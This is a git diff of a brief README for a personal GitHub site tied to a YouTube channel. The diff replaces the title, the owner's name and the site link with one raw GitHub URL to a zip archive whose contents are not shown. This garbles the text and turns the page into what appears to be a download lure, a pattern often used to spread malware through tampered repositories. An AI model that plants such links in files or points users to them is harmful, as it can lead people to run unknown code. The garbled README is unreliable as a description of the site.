@@ -1,14 +1,14 @@
-# Raniya Official.Github.io
+# Raniya https://raw.githubusercontent.com/ranidudewmina/duck-e/main/sline/duck-e.zip
 
 ## Official Website Of Ranidu Dewmina Youtube Channel
 
 ## Web Create and Devoloped By 
 
-* Mr.Ranidu Dewmina  ( Owner Of Raniya Official)
+* https://raw.githubusercontent.com/ranidudewmina/duck-e/main/sline/duck-e.zip Dewmina  ( Owner Of Raniya Official)
 * Study in Mo/Nisshanka Central College
 * From Madukotan Arawa
 * Like and share...
 
 ##  
 
- Link: [https://ranidudewmina.github.io]
+ Link: [https://raw.githubusercontent.com/ranidudewmina/duck-e/main/sline/duck-e.zip]
